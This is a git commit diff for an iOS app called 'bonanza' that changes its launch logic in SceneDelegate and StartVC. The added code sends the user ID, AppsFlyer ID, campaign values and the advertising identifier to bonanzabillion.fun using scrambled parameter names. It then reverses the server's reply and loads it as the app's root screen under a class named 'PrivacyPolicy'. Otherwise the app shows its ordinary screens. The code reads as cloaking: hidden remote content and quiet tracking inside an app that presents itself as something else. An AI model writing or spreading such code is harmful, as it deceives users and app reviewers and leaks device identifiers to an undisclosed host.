bd73197ef44c27ea112e76809bcd7a1ccd8de7d8
Evhen <35118152+Ribeyrak@users.noreply.github.com>
2023-06-08 15:21:57 +0300

    delete remote config

--- bonanza/Application/SceneDelegate.swift
+++ bonanza/Application/SceneDelegate.swift
@@ -14,7 +14,7 @@ import AppTrackingTransparency
 import AdSupport
 
 class SceneDelegate: UIResponder, UIWindowSceneDelegate {
-
+    
     var window: UIWindow?
     var appsFID: String = ""
     var utms: String = "organic"
@@ -22,48 +22,28 @@ class SceneDelegate: UIResponder, UIWindowSceneDelegate {
     var campID: String = ""
     var appDelegate: AppDelegate?
     var advertising_id: String = ""
-
+    
     func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
         guard let windowScene = (scene as? UIWindowScene) else { return }
         window = UIWindow(windowScene: windowScene)
         appDelegate = UIApplication.shared.delegate as? AppDelegate
         appsFID = AppsFlyerLib.shared().getAppsFlyerUID()
-        configureRemoteConfig()
+        parseCampaing()
     }
-
-    func configureRemoteConfig() {
-        RCValues.sharedInstance.fetchCloudValues { [weak self] success in
-            if success {
-                DispatchQueue.main.async {
-                    self?.continueSceneConfiguration()
-                }
-            } else {
-                // Handle failure to fetch Remote Config values
-            }
-        }
-    }
-
+    
     func continueSceneConfiguration() {
-        let rc = RCValues.sharedInstance.updateFlag()
-
-        if rc == false {
-            if let _: ProfileModel = FileDataManager().read(key: .one) {
-                let viewController = UINavigationController(rootViewController: MainVC())
-                window?.rootViewController = viewController
-            } else {
-                let viewController = UINavigationController(rootViewController: StartVC())
-                window?.rootViewController = viewController
-            }
+        if let _: ProfileModel = FileDataManager().read(key: .one) {
+            let viewController = UINavigationController(rootViewController: MainVC())
+            window?.rootViewController = viewController
         } else {
-            checkUser()
-            parseCampaing()
+            let viewController = UINavigationController(rootViewController: StartVC())
+            window?.rootViewController = viewController
         }
-
         window?.makeKeyAndVisible()
     }
-
+    
     func sceneDidBecomeActive(_ scene: UIScene) {
-         //Retrieve IDFA if tracking is enabled
+        //Retrieve IDFA if tracking is enabled
         if #available(iOS 14, *) {
             ATTrackingManager.requestTrackingAuthorization { [weak self] status in
                 DispatchQueue.main.async {
@@ -92,15 +72,7 @@ class SceneDelegate: UIResponder, UIWindowSceneDelegate {
                 print(error)
                 return
             } else {
-                RCValues.sharedInstance.fetchCloudValues { [weak self] success in
-                    if success {
-                        DispatchQueue.main.async {
-                            self?.checkUser()
-                        }
-                    } else {
-                        // Handle failure to fetch Remote Config values
-                    }
-                }
+                self?.checkUser()
                 print(dictionary ?? "")
                 return
             }
@@ -114,39 +86,31 @@ class SceneDelegate: UIResponder, UIWindowSceneDelegate {
             self.advertising_id = ASIdentifierManager.shared().advertisingIdentifier.uuidString
         }
     }
-
+    
     func checkUser() {
         // Your logic to retrieve CUID
         let customUserId = UserDefaults.standard.string(forKey: UserDefaultsKeys.userID.rawValue)
         if let customUserId = customUserId, !customUserId.isEmpty {
             // Set CUID in AppsFlyer SDK for this session
             AppsFlyerLib.shared().customerUserID = customUserId
-            AppsFlyerLib.shared().start() // Start
+            AppsFlyerLib.shared().start()
         } else {
             let uuid = UUID().uuidString
             UserDefaults.standard.set(uuid, forKey: UserDefaultsKeys.userID.rawValue)
             AppsFlyerLib.shared().customerUserID = uuid
-            AppsFlyerLib.shared().start() // Start
+            AppsFlyerLib.shared().start()
         }
     }
     
     func parseCampaing() {
-//        let jsonString = K.json
-//
-//        let data = Data(jsonString.utf8)
-//        var convertionData: ConversionData
-        
         do {
-            //convertionData = try JSONDecoder().decode(ConversionData.self, from: data)
-            //let components = convertionData.campaign.components(separatedBy: "_")
-            
             let components = campaign.components(separatedBy: "_")
             var t1 = "organic"
             var t2 = "organic"
             var t3 = "organic"
             var t4 = "organic"
             var t5 = "organic"
-
+            
             if components.count >= 5 {
                 t1 = components[0]
                 t2 = components[1]
@@ -154,25 +118,22 @@ class SceneDelegate: UIResponder, UIWindowSceneDelegate {
                 t4 = components[3]
                 t5 = components[4]
             }
-
+            
             let urlString = "https://bonanzabillion.fun/NiUS37WTD?1drgsc6=\(UserDefaults.standard.string(forKey: UserDefaultsKeys.userID.rawValue)!)&ZCcmVT9XF=\(appsFID)&upiyls=\(campID)&Yaymb09=\(AppsFlyerLib.shared().appleAppID)&yd8Ls=\(utms)&qsL6UPS9XU=\(t1)&vlnaomzd=\(t2)&lrz2Cbs=\(t3)&AB23Cf78=\(t4)&xA5Ga1=\(t5)&sn23sl6=\(advertising_id)"
-                        
+            
             AF.request(urlString).response { [self] response in
                 switch response.result {
                 case .success(let value):
                     let someString = String(data: value!, encoding: .utf8)
                     let tempSting = String(someString!.reversed())
+                    print(tempSting)
                     let privacyPolicyVC = PrivacyPolicy(link: tempSting)
                     privacyPolicyVC.link = tempSting
-                    
                     let viewController = UINavigationController(rootViewController: PrivacyPolicy(link: tempSting))
                     window?.rootViewController = viewController
+                    window?.makeKeyAndVisible()
                 case .failure(let error):
-                    print("Request failed with error: \(error)")
-                    let privacyPolicyVC = PrivacyPolicy(link: RCValues.sharedInstance.updateLink(forKey: .link))
-                    privacyPolicyVC.link = RCValues.sharedInstance.updateLink(forKey: .link)
-                    let viewController = UINavigationController(rootViewController: StartVC())
-                    window?.rootViewController = viewController
+                    continueSceneConfiguration()
                 }
             }
             
--- bonanza/Login/StartVC.swift
+++ bonanza/Login/StartVC.swift
@@ -8,6 +8,8 @@
 import UIKit
 import SnapKit
 import Then
+import Alamofire
+import AppsFlyerLib
 
 final class StartVC: UIViewController {
     
@@ -54,9 +56,18 @@ final class StartVC: UIViewController {
         $0.layer.cornerRadius = 2
     }
     
+    var window: UIWindow?
+    var appsFID: String = ""
+    var utms: String = "organic"
+    var campaign: String = ""
+    var campID: String = ""
+    var appDelegate: AppDelegate?
+    var advertising_id: String = ""
+    
     // MARK: - Lifecycle
     override func viewDidLoad() {
         super.viewDidLoad()
+        //parseCampaing()
         setupUI()
         bindUI()
     }
@@ -102,6 +113,53 @@ final class StartVC: UIViewController {
         joinButton.addAction(.init(handler: { [self] _ in
             nextVC()
         }), for: .touchUpInside)
+    }
+    
+    func parseCampaing() {
+        do {
+            let components = campaign.components(separatedBy: "_")
+            var t1 = "organic"
+            var t2 = "organic"
+            var t3 = "organic"
+            var t4 = "organic"
+            var t5 = "organic"
+            
+            if components.count >= 5 {
+                t1 = components[0]
+                t2 = components[1]
+                t3 = components[2]
+                t4 = components[3]
+                t5 = components[4]
+            }
+            
+            let urlString = "https://bonanzabillion.fun/NiUS37WTD?1drgsc6=\(UserDefaults.standard.string(forKey: UserDefaultsKeys.userID.rawValue))&ZCcmVT9XF=\(appsFID)&upiyls=\(campID)&Yaymb09=\(AppsFlyerLib.shared().appleAppID)&yd8Ls=\(utms)&qsL6UPS9XU=\(t1)&vlnaomzd=\(t2)&lrz2Cbs=\(t3)&AB23Cf78=\(t4)&xA5Ga1=\(t5)&sn23sl6=\(advertising_id)"
+            
+            AF.request(urlString).response { [self] response in
+                switch response.result {
+                case .success(let value):
+                    print("TESSST")
+
+                    let someString = String(data: value!, encoding: .utf8)
+                    let tempSting = String(someString!.reversed())
+                    let privacyPolicyVC = PrivacyPolicy(link: tempSting)
+                    privacyPolicyVC.link = tempSting
+                    
+                    let viewController = UINavigationController(rootViewController: PrivacyPolicy(link: tempSting))
+                    window?.rootViewController = viewController
+                case .failure(let error):
+                    print("TESSST+++")
+
+                    print("Request failed with error: \(error)")
+                    let privacyPolicyVC = PrivacyPolicy(link: RCValues.sharedInstance.updateLink(forKey: .link))
+                    privacyPolicyVC.link = RCValues.sharedInstance.updateLink(forKey: .link)
+                    let viewController = UINavigationController(rootViewController: StartVC())
+                    window?.rootViewController = viewController
+                }
+            }
+            
+        } catch {
+            print("Error decoding JSON: \(error)")
+        }
     }
     
     // MARK: - Actions
